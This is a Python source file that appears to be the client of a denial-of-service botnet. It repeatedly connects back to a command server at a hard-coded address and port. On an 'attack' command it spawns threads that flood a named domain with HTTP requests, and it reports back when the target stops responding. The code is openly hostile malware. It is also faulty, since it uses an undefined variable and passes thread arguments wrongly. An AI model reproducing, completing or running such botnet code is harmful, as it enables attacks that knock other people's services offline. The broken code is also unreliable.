import socket
import threading
import requests
import os
import subprocess
import asyncio
import time
from time import sleep
   
RHost = "10.0.2.15" 
Hilos = []
 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connected = False
def listener():
    print("[+] Listening")
    while True:
        try:
            s.connect((RHost, 4445))  
            break
             

        except:
            time.sleep(2)


def attack(data, *args): 
    data = f"{data}{''.join(i for i in m)}"
    domain = data.split(" ")[1]
    packets = int(data.split(" ")[2])
    port = 80  
    reqs = 0

    
    for i in range(packets):
        try:
            reqs += 1  
            requests.get(f"http://{domain}:{port}")
             

        except:
            s.send(f"[+] {domain} Is not responding, the attack has probably been successful".encode())
            pass
 

def main():
    while True:
        try:
            s.connect((RHost, 4445))
        except:
            pass
        data = s.recv(128)
        data = data.decode('utf-8').replace("\r\n", "")
          

        if data.startswith("attack"):

            workers = int(data.split(" ")[3])
            for i in range(workers):
                t = threading.Thread(target=attack, args=data)
                Hilos.append(t)
                t.start()
            for hilo in Hilos:
                hilo.join()

        
        if data.startswith("exit"):
            s.close() 
            listener()
            

        try:
            s.connect((RHost, 4445))
        except:
            pass

     

if __name__ == '__main__':
    while True:
        listener()
        main()    
    

    
        
